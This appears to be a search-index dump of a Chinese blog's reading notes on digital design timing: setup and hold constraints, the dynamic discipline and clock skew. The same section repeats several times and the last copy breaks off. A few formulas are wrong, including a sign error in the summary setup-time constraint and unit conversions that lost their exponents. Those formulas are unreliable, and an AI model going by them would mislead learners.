3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#351-the-dynamic-discipline"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#352-system-timing"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#setup-time-constraint"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System Timing在对电路的时序进行分析之前，我们需要明确两个值：$T_{c}$和$f_{c}$。前者是指两个时钟上升沿之间的时间间隔，也叫时钟周期。后者是前者的倒数，是时钟频率。时钟频率的增加，可以带来吞吐量的增加。时钟频率的单位包括：Hz，MHz和GHz。其单位换算如下： 1 megahertz (MHz) = 106 Hz 1 gigahertz (GHz) = 109 Hz. 结合上述电路块的结构分析，一个电路的值传递有如下几个阶段： 从输入，经过触发器R1，到Q1 从Q1，经过组合逻辑电路，到D2 从D2输入到触发器R2 3.5.2.1 Setup Time Constraint 在对约束条件进行分析时，我们采用worst case analysis，也就是分析极限情况下的边界条件。需要注意的是setup time constraint指的不是setup time，而是对组合逻辑电路最大值的限制，因为组合逻辑部分是这个电路唯一可以优化的部分。 对电路setup time的约束主要在于触发器R2。分析如下： 在时钟上升沿后，触发器R1的值最多需要经过$t_{pcq}$才能到达Q1 Q1的值最多需要经过$t_{pd}$才能到达D2 总的时钟周期为$T_{c}$ 而D2输入必须满足setup time的要求，也就是说： D2的输入必须至少在时钟上升沿前$t_{setup}$刻开始保持稳定，即组合逻辑电路的值必须在$T_{c} - t_{setup}$时刻或之前抵达D2 综上分析，我们可以得出以下公式： $t_{pcq}+t_{pd}\u003c=T_{c}-t_{setup}$ 通过移项运算，我们可以得到如下公式： $$ T_{c} \u003e= t_{pcq}+t_{pd}+t_{setup} $$ 那么，$T_{c}$的值至少为$t_{pcq}+t_{pd}+t_{setup}$，那么$f_{c}$的值最大为 $$ f_{c} = \\frac{1}{t_{pcq}+t_{pd}+t_{setup}} $$ 通过这个公式，我们可以了解到，该电路的主要可优化部分为组合逻辑部分，$t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ 称为setup time constraint。 3.5.2.2 Hold Time Constraint对于hold time的约束条件探索，我们同样采用取极端情况的情况，就是不考虑组合逻辑（其延迟为0）。 对于R2的输入D2，其之前的值需要保存$t_{hold}$个单位的时间。但是从R1过来的值，最短只需要$t_{ccq}+t_{cd}$个时刻就能到达，因此可以得出以下表达式： $$ t_{ccq}+t_{cd}\u003e=t_{hold} $$ 因此，可以得出如下表达式： $$ t_{cd} ≥ t_{hold}-t_{ccq} $$ 组合逻辑电路延迟的最小值是 $t_{hold}-t{ccq}$。当两个触发器直接相接的时候，$t_{ccq}=0$，那么要求$t_{hold}\u003c=t_{ccq}$。通常情况下我们默认$t_{hold}=0$，那么上述不等于恒成立。但是如果该条件不成立，我们就需要增加$t_{ccq}$，这需要对电路进行大量的修改，并且耗费巨大的资金，因此我们在设计电路时需要谨慎地考虑$t_{hold}$约束。 3.5.2.3 Putting It All Together 时序分析案例见课本P145面 两条约束原则： $t_{pd} ≤T_{c}−t_{pcq} +t_{setup}$ $t_{cd} ≥ t_{hold}-t_{ccq}$ 修复hold time violation，可以用加buffer的方式。但是要注意的是，有的时候加了Buffer后会改变关键路径，从而改变setup time的约束情况。 3.5.3 3.5.3 Clock Skew 这一段也不太好理解，尤其是hold time的部分，我参考了以下油管视频： Clock skew的含义是：对各个触发器时钟上升沿到达的时间不一致。 产生clock skew的原因包括： 通往多个clock的线的长度不一致 噪声（Noise） clock gating 在讲解Clock Skew之前，我们需要再看一下电路图： 对于一个触发器，master的CLK是通过slave的CLK取反得到的，因此这个非门可能会导致两个CLK的上升沿不一致，如图： 因CLK1比CLK2多经过1个非门，因此时钟到达CLK2的时间更早，CLK1更晚 3.5.3.1 setup time constraint分析我们从worst case scenario分析（这里的worst case scenario指的是触发器输出和组合逻辑传递都取最长时间。因为我们要探索的是，在CLK1和CLK2的时钟上升沿间隔缩短，触发器输出和组合逻辑传输时间最长的情况下，依然保证留有$t_{setup}$个单位的时间，供R2维持输入的稳定）： 从CLK1的上升沿开始，R1的值经过最多$t_{pcq}$进入到Q1； 经过组合逻辑的电路的延迟$t_{pd}$，Q1传输到D2， D2输入至少要在CLK2的上升沿前$t_{setup}$时刻达到，甚至更早 也就是说，从CLK1的上升沿，至少经过$t_{pcq}+t_{pd}+t_{setup}$抵达CLK2的上升沿。而从CLK1的上升沿到CLK2的上升沿，经过的时间是$T_{c}-t_{skew}$ 经过如上分析，我们可以建立不等式： $$ T_{c} - t_{skew} \u003e= t_{pcq} + t_{pd} + t_{setup} $$ 对其进行移位变换，我们可以得到： $$ T_{c} \u003e= t_{pcq} + t_{pd} + t_{setup} + t_{skew} $$ 同上，setup time constraint指的是组合逻辑电路的延迟限制（因为组合逻辑电路是电路中唯一一个可以优化的部分，其他的时钟频率、触发器时延、时钟时延、setup time 都是不可改变的），我们可以得到如下不等式： $$ t_{pd} \u003c= T_{c} - (t_{pcq}+t_{setup}+t_{skew}) $$ 3.5.3.2 hold time constraint分析对于hold time constraint，我们同样分析的是R2，R2的值必须在CLK2时钟上升沿后，R1传过来的值到达前，保持至少hold time个时间单位。我们依然从worst case scenario分析（这里与setup time constraint的worst case不同，我们需要探测从R1传输过来的时间最短的情况，必须要让hold time比最短的传输时间还短，否则会导致hold time violation）： R1的输出最少需要$t_{ccq}$个时间单位进入Q1 Q1最少需要$t_{cd}$个时间单位进入D2 但是，因为有了clock skew。因此，哪怕信号已经到达了，而且CLK1已经经过了一个时钟周期，它也还需要再等待$t_{skew}$个单位的时间，才能进入R2。这为R2的$t_{hold}$争取到了一些额外的时间。 那么，我们就可以得到如下不等式： $$ t_{hold} + t_{skew} \u003c= t_{ccq} + t_{cd} $$ 同上，组合逻辑电路是这个电路中唯一可以优化的部分，组合逻辑电路的时延要求如下： $$ t_{cd} \u003e= t_{hold} + t_{skew","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#hold-time-constraint"},{"categories":["计算机体系结构"],"content":" 3.5 3.5 Timing of Sequential Logic 这一段写得非常绕，但是我在找了几个油管的视频之后理解了，视频链接如下： 首先，我们需要了解一个原则，就是CLK时钟从0到1的变化，并不是突然之间产生的，而是经过一个短暂的阶梯型变化过程。从第一章的内容我们可以知道，模拟电路到数字电路的转换之前，需要对高电平和低电平进行定义。在某个电压之上，我们将其状态定义为高电平；在某个电压之下，我们将其定义为低电平；而在这之间，电平处于无效状态。 触发器的状态更新，就是发生在时钟上升沿。但是触发器并不是一个单一的部件，其由内部多个逻辑门所构成。如D触发器的结构如下： 在CLK位于低电平时，输入从D到N1，需要经过一个D锁存器。从N1到Q，需要经过一个D锁存器。我们需要保证触发器中的值（也就是slave锁存器中的值）是稳定的，那么就要求从D输入到N1，以及N1输入到Q的过程中，这个值保持稳定。从D输入到N1的时间，我们称为setup time；从N1到Q的时间，我们称为hold time。也就是说，输入必须在setup time + hold time期间内，保持稳定。不稳定所带来的情况，我们将在3.5.4 Metastability一节中讨论。 setup time和hold time之和也叫aperture time 3.5.1 3.5.1 The Dynamic Discipline 结合上述电路图，我们阐述几个重要的时间： contamination delay（$t_{ccq}$）：从上升沿获取输入，到得到Q1输出的最短时间 propagation delay（$t_{pcq}$）：从上升沿获取输入，到得到Q1输出的最长时间 setup time：在CLK上升沿之前，输入至少保持setup time hold time：在CLK上升沿之后，输入至少保持hold time 组合逻辑电路的延迟（$t_{pd}$）：值从Q1到Q2的最大时间 3.5.2 3.5.2 System 